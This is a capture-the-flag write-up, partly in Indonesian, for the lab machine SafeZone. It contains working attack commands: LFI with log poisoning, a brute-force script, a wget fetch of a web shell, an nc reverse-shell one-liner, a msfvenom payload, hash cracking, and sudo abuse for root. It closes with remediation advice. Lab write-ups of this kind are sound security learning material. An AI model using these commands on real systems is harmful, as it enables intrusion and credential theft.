# SafeZone

**Target:** safezone.thm  
**Difficulty:** Medium  

---

## 1. Executive Summary

Laporan ini mendokumentasikan proses pengerjaan penetrasi terhadap mesin SafeZone. Melalui serangkaian teknik pengerjaan yang terstruktur, saya berhasil memperoleh akses awal ke sistem, melakukan eskalasi privilege dari user www-data ke files, kemudian ke yash, hingga akhirnya mendapatkan akses root.

**Findings Ringkasan:**

| Severity | Finding | Status |
|----------|---------|--------|
| Critical | Remote Code Execution via LFI | Exploited |
| High | Weak Admin Password Policy | Exploited |
| Medium | Insecure Direct Object Reference (IDOR) | Exploited |
| High | sudo Privilege Misconfiguration | Exploited |

---

## 2. Scope and Methodology

### 2.1 Methodology
```
Reconnaissance → Enumeration → Vulnerability Assessment → Exploitation → Privilege Escalation → Documentation
```

### 2.2 Rules of Engagement
- Semua pengerjaan dilakukan dalam scope yang diizinkan
- Tidak ada destructive testing
- Dokumentasi lengkap dilakukan sepanjang proses

---

## 3. Reconnaissance & Enumeration

### 3.1 Port Scanning

**Command:**
```bash
nmap -sC -sV safezone.thm -oN nmap_report
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29
```

**Analysis:**
- Port 22 (SSH) - Potential entry point jika credential ditemukan
- Port 80 (HTTP) - Web aplikasi yang menjadi attack surface utama

### 3.2 Directory Enumeration

**Command:**
```bash
gobuster dir -u safezone.thm -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

**Discovered Endpoints:**
```
/.php                 (Status: 403)
/.html                (Status: 403)
/dashboard.php        (Status: 302) → index.php
/detail.php           (Status: 302) → index.php
/index.php            (Status: 200) - Login Page
/logout.php           (Status: 200)
/news.php             (Status: 302) → index.php
/note.txt             (Status: 200) - INFO DISCOVERY
/register.php         (Status: 200) - Registration Page
```

### 3.3 Information Disclosure

**File:** `/note.txt`
```
Message from admin :-
    I can't remember my password always , that's why I have saved it in /home/files/pass.txt file .
```

**Finding:** Admin mengungkapkan lokasi file password, menunjukkan poor security awareness.

---

## 4. Initial Access

### 4.1 Web Application Analysis

1. **Akses halaman register:**
   ```
   http://safezone.thm/register.php
   ```

2. **Buat akun baru:**
   - Registration berhasil
   - Redirect ke dashboard setelah login

3. **Dashboard Analysis:**
   - `/dashboard.php` - Main dashboard
   - `/news.php` - Contains hint: "I have something to tell you , it's about LFI or is it RCE or something else?"
   - `/detail.php` - Restricted feature

### 4.2 Local File Inclusion (LFI) Discovery

**Source Code Revelation:**
```
<!-- try to use "page" as GET parameter-->
```

**Exploitation:**
```bash
# Test LFI vulnerability
http://safezone.thm/detail.php?page=/etc/passwd

# LFI ke Apache Log
http://safezone.thm/detail.php?page=..//..//..//..//..//..//..//..//..//..//var//log//apache2//access.log
```

### 4.3 Admin Password Discovery

**Path yang ditemukan:**
```
http://safezone.thm/~files/pass.txt
```

**Content:**
```
Admin password hint :-
    admin__admin
    "__ means two numbers are there , this hint is enough I think :) "
```

### 4.4 Password Brute-Force

**Password Pattern:** `admin{XX}admin` dimana XX adalah 2 digit angka

**Script:** `bruteforce.py`
```python
#!/usr/bin/python3
import requests
import time
import re

teststop = 0
for x in range(10):
    for y in range(10):
        trypass = "admin"+str(x)+str(y)+"admin"        
        datafuzz = {"username":'Admin',"password":trypass,"submit":'Submit'}
        response = requests.post('http://safezone.thm/index.php', data=datafuzz)
        found = re.findall('Please enter valid login details', response.text)
        found2 = re.findall('To many failed', response.text)
        print(trypass + ":", end="" )
        if found != [] or found2 != []:
            print("Not found")
        else:
            print("found!")
            print("Finishing.")
            quit();
        teststop = teststop+1
        if teststop > 2:
            print()
            print("sleeping...")
            print()
            time.sleep(57)
            print("resuming...")
            teststop = 0
            time.sleep(3)
```

**Result:**
```
admin42admin:Not found
admin43admin:Not found
admin44admin:found!
```

**Valid Credentials:**
- Username: `admin`
- Password: `admin44admin`

---

## 5. Remote Code Execution

### 5.1 Web Shell Deployment

**Setup Local HTTP Server:**
```bash
python3 -m http.server 8000
```

**Web Shell Source:** https://github.com/artyuum/Simple-PHP-Web-Shell

**Upload via LFI + Apache Log Poisoning:**
```bash
# Command injection melalui User-Agent atau GET parameter
http://safezone.thm/detail.php?page=..//..//..//..//..//..//..//..//..//..//var//log//apache2//access.log&cmd=wget%20http://192.168.212.23:8000/web.php%20-O%20/tmp/web.php
```

**Verify Upload:**
```bash
http://safezone.thm/detail.php?page=/tmp/web.php
```

### 5.2 Reverse Shell Connection

**Listener:**
```bash
nc -lvnp 4444
```

**Execute Payload:**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.212.23 4444 >/tmp/f
```

**Connection Received:**
```
nc -lvnp 4444 
listening on [any] 4444 ...
connect to [192.168.212.23] from (UNKNOWN) [10.49.158.122] 39738
/bin/sh: 0: can't access tty; job control turned off
$
```

### 5.3 Shell Stabilization
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 6. First Privilege Escalation (www-data → files)

### 6.1 Sudo Configuration Analysis
```bash
www-data@safezone:/home$ sudo -l

User www-data may run the following commands on safezone:
    (files) NOPASSWD: /usr/bin/find
```

### 6.2 Exploitation
```bash
sudo -u files find . -exec /bin/sh -p \; -quit
```

**Result:**
```
$ id
uid=1001(files) gid=1001(files) groups=1001(files)
```

---

## 7. Second Privilege Escalation (files → yash)

### 7.1 Hidden File Discovery
```bash
files@safezone:~$ cat '.something#fake_can@be^here'

files:$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.
```

### 7.2 Hash Cracking

**Save Hash to File:** `hashes.txt`
```
files:$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.
```

**Crack dengan Hashcat:**
```bash
hashcat -a 0 -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Result:**
```
$6$BUr7qnR3$...:magic
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
```

**Credentials Obtained:**
- Username: `files`
- Password: `magic`

### 7.3 SSH Access
```bash
ssh files@safezone.thm
```

---

## 8. Hidden Service Enumeration

### 8.1 Port Forwarding Discovery

**Internal Service Found:**
```bash
files@safezone:~$ curl http://127.0.0.1:8000 -v
< Server: nginx/1.14.0 (Ubuntu)
< HTTP/1.1 403 Forbidden
```

**Service:** nginx pada port 8000 (localhost only)

### 8.2 SSH Tunnel Setup
```bash
ssh -L 2222:127.0.0.1:8000 files@safezone.thm
```

### 8.3 Hidden Service Enumeration
```bash
gobuster dir -u http://127.0.0.1:2222 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php
```

**Discovered:**
```
/login.html           (Status: 200)
/login.js             (Status: 200) - INFO DISCOVERY
```

### 8.4 JavaScript Analysis

**login.js:**
```javascript
var attempt = 3;
function validate(){
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
    if ( username == "user" && password == "pass"){
        alert ("Login successfully");
        window.location = "pentest.php";
        return false;
    }
    // ...
}
```

**Credentials:**
- Username: `user`
- Password: `pass`

---

## 9. Third Privilege Escalation (files → yash via Hidden Service)

### 9.1 Malicious Payload Generation
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.212.23 LPORT=4444 -f elf > shell
```

### 9.2 Payload Upload
```bash
scp shell files@safezone.thm:/tmp/
ssh files@safezone.thm
chmod +x /tmp/shell
```

### 9.3 Reverse Shell Trigger

**Listener:**
```bash
nc -lvnp 4444
```

**Execute melalui pentest.php:**
```
[Upload shell path in pentest.php input field]
```

**Connection Received:**
```
nc -lvnp 4444
connect to [192.168.212.23] from (UNKNOWN) [10.49.172.210] 60496
```

### 9.4 Shell Stabilization
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 10. User Flag

```bash
yash@safezone:/home/yash$ cat flag.txt
THM{[REDACTED]}
```

---

## 11. Final Privilege Escalation (yash → root)

### 11.1 Sudo Configuration
```bash
yash@safezone:/home/yash$ sudo -l

User yash may run the following commands on safezone:
    (root) NOPASSWD: /usr/bin/python3 /root/bk.py
```

### 11.2 Backup Script Analysis

**Script:** `/root/bk.py`
```python
#!/usr/bin/env python3

import sys
import shutil
import os

filename = input("Enter filename: ")
destination = input("Enter destination: ")
password = input("Enter Password: ")

if password == "123456":
    shutil.copy(filename, destination)
else:
    print("Wrong password!")
    sys.exit(0)
```

**Vulnerability:** Hardcoded weak password "123456"

### 11.3 Root Access
```bash
yash@safezone:/home/yash$ sudo /usr/bin/python3 /root/bk.py
Enter filename: /root/root.txt
Enter destination: /home/yash
Enter Password: 123456

yash@safezone:/home/yash$ cat root.txt
THM{[REDACTED]}
```

---

## 12. Attack Path Summary

```
ATTACK CHAIN VISUALIZATION

┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│   INTERNET    │────▶│   PORT 80    │────▶│  LFI (RCE)   │
│               │     │   (Apache)   │     │   FOUND      │
└──────────────┘     └──────────────┘     └──────┬───────┘
                                                   │
                                                   ▼
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│  WWW-DATA    │◀────│  WEBSHELL    │◀────│  BRUTEFORCE  │
│   (SHELL)    │     │  DEPLOYED    │     │   ADMIN PW   │
└──────┬───────┘     └──────────────┘     └──────────────┘
       │
       │ sudo find
       ▼
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│    FILES     │────▶│    HASH       │────▶│    CRACKED   │
│   (USER)     │     │  DISCOVERED   │     │  (magic)     │
└──────┬───────┘     └──────────────┘     └──────┬───────┘
       │
       │ ssh files@safezone
       ▼
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│   PORT 8000  │────▶│  HIDDEN       │────▶│  CREDENTIALS │
│  (TUNNELED)  │     │  SERVICE      │     │  (user/pass) │
└──────┬───────┘     └──────────────┘     └──────┬───────┘
       │
       │ pentest.php exploit
       ▼
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│     YASH     │────▶│    Sudo       │────▶│     ROOT     │
│   (USER)     │     │  bk.py        │     │  (ACCESSED)  │
└──────────────┘     └──────────────┘     └──────────────┘
```

---

## 13. Remediation Recommendations

### 13.1 Critical Priority

| Vulnerability | Recommendation |
|--------------|----------------|
| LFI to RCE | Implement strict input validation, disable allow_url_fopen, use whitelist for file inclusions |
| Weak Admin Password | Enforce strong password policy (min 12 chars, complexity requirements) |
| sudo NOPASSWD find | Remove unnecessary sudo privileges, use full paths in sudoers |

### 13.2 High Priority

| Vulnerability | Recommendation |
|--------------|----------------|
| Hidden Service Exposed | Do not expose internal services, implement proper authentication |
| Hash Storage in Cleartext | Never store passwords in files, use proper secrets management |
| Backup Script Hardcoded Password | Use environment variables or secure vault for credentials |

### 13.3 Medium Priority

| Vulnerability | Recommendation |
|--------------|----------------|
| Information Disclosure | Remove comments from production code, sanitize error messages |
| Verbose Error Messages | Implement custom error pages, log errors to secure location |
| Predictable Password Pattern | Use truly random passwords, implement account lockout policy |

---

## 14. Appendix

### A. Files in Repository

```
/home/santstyle/Desktop/THM/SafeZone/
├── README.MD          - Full penetration testing report
├── bruteforce.py      - Admin password brute-force script
├── hashes.txt         - Hash untuk user 'files'
├── web.php            - Web shell yang digunakan
└── nmap_report        - Nmap scan results
```

### B. Tools Used

- Nmap (Port Scanning)
- Gobuster (Directory Enumeration)
- Hashcat (Password Cracking)
- msfvenom (Payload Generation)
- Netcat (Reverse Shell)

### C. References

- Web Shell: https://github.com/artyuum/Simple-PHP-Web-Shell
- Wordlists: /usr/share/wordlists/dirb/common.txt, rockyou.txt

---
